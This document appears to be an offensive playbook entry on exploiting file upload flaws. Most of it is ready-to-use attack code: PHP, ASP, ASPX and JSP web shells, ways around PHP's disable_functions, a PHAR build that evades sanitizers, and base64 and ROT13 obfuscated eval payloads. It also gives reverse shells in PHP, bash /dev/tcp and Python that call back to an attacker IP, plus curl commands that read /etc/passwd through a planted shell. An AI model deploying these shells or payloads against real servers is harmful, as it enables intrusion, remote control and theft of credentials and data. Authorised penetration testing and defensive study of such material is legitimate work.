# File Upload — Web Shell Payloads

## When this applies

- File upload accepts server-side scripts (PHP/ASP/JSP) as the actual content type.
- You've established that uploaded files reach an executable directory.
- Goal: pick the right web shell for the target language and convince the server to execute it.

## Technique

Use the smallest functional shell first to confirm execution, then escalate to a full-featured shell. Adapt to the target stack (PHP / ASP / JSP). Bypass `disable_functions` with less common primitives if standard system/exec are blocked.

## Steps

### PHP Web Shells

```php
# Simple command execution
<?php system($_GET['cmd']); ?>

# File read payload
<?php echo file_get_contents('/etc/passwd'); ?>

# Specific target file
<?php echo file_get_contents('/var/www/html/config.php'); ?>

# Full web shell with output
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>

# Minimal shell
<?=`$_GET[0]`?>

# Alternative syntax
<?php passthru($_GET['cmd']); ?>
<?php exec($_GET['cmd']); ?>
```

### `disable_functions` bypass — when system/exec/shell_exec/passthru are blocked

Production PHP installs commonly disable `system,exec,shell_exec,passthru,proc_open,curl_exec` together. Functions admins routinely **forget** to add to `disable_functions`:

```php
# popen() — opens a pipe and returns a stream; not in default disable lists
<?php $h = popen($_GET[0], 'r'); echo stream_get_contents($h); pclose($h); ?>

# error_log() with type=3 — writes to a file, plus type=1 mails to an addr;
# combined with mail()-via-LD_PRELOAD this is RCE on glibc
<?php error_log($_GET[0], 1, 'attacker@x'); ?>

# pcntl_exec() — bypasses *most* policies (rarely listed)
<?php pcntl_exec('/bin/sh', ['-c', $_GET[0]]); ?>

# include() / require() with php://filter chain (CVE-2024-2961 family) —
# arbitrary write/read primitive on glibc with iconv
```

Always probe with `phpinfo()` first (most disable_functions audits expose the list) — pick the function that's missing rather than fighting filters.

### PHAR archive bypass for `<?php`-stripping content sanitizers

When the upload sanitizer strips literal `<?php` from text files but `.phar` is whitelisted in the extension allowlist, a real PHAR archive smuggles the PHP stub past the scanner. The PHAR's binary signature plus the leading `<?php ... __HALT_COMPILER();?>` stub is preserved verbatim. Apache's default `FilesMatch ".+\.ph(ar|p|tml)$"` mapping then routes it to the PHP handler.

```php
// Build locally with: php -d phar.readonly=0 build.php
$p = new Phar('/tmp/x.phar');
$p->startBuffering();
$p->setStub('<?php $h = popen($_GET[0], "r"); echo stream_get_contents($h); pclose($h); __HALT_COMPILER();');
$p->addFromString('h.txt', 'hi');     // any dummy file — required, otherwise build fails
$p->stopBuffering();
```

Then upload the resulting `x.phar`. Use `popen()` instead of `system()` if `disable_functions` is set.

This is also the right approach when Apache is configured with PHP-FPM via `SetHandler "proxy:unix:/var/run/php/php-fpm.sock|fcgi://localhost"` for any extension matching `.+\.ph(ar|p|tml)$` — the broader regex is the seam.

### ASP/ASPX Web Shells

```asp
# Classic ASP
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Response.Write(oScript.Exec("cmd /c " & Request.QueryString("cmd")).StdOut.ReadAll)
%>

# ASP.NET (ASPX)
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e){
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
</script>
```

### JSP Web Shells

```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
%>
```

### Reverse Shell Payloads

```php
# PHP Reverse Shell
<?php
$ip = '<ATTACKER_IP>';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>

# Bash Reverse Shell (via PHP)
<?php system('bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"'); ?>

# Python Reverse Shell (via PHP)
<?php system('python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<ATTACKER_IP>\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"'); ?>
```

### Obfuscated payloads

```php
# Base64 Encoded
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>
# Decodes to: system($_GET['cmd']);

# ROT13 Encoded
<?php eval(str_rot13('flfgrz($_TRG[\'pzq\']);')); ?>

# Variable function execution
<?php $a='system'; $a($_GET['cmd']); ?>
```

### Alternative code execution

```php
# assert() function
<?php assert($_GET['c']); ?>

# preg_replace() with /e modifier (older PHP)
<?php preg_replace('/.*/e', $_GET['c'], ''); ?>

# create_function()
<?php $f=create_function('',$_GET['c']);$f(); ?>

# Array functions
<?php array_map('system',array($_GET['c'])); ?>
```

### Quick test commands

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl http://target.com/uploads/shell.php?cmd=id
curl http://target.com/uploads/shell.php?cmd=cat+/etc/passwd
curl http://target.com/uploads/shell.php?cmd=ls+-la
nc -lvnp 4444
```

## Verifying success

- `?cmd=id` returns `uid=...` output.
- `phpinfo.php` returns the PHP info table (confirms PHP execution).
- Reverse shell connects to your listener.

## Common pitfalls

- Some sanitizers strip `<?php` — use PHAR archives or `<?=` short-tag.
- PHP `disable_functions` may be set — try `popen`, `error_log`, `pcntl_exec`.
- Some apps re-process uploaded images (resize, strip metadata) — this destroys payloads in EXIF / appended bytes.

## Tools

- nc / ncat (listener)
- msfvenom (payload generation)
- Reverse shell cheat-sheet sites (revshells.com)
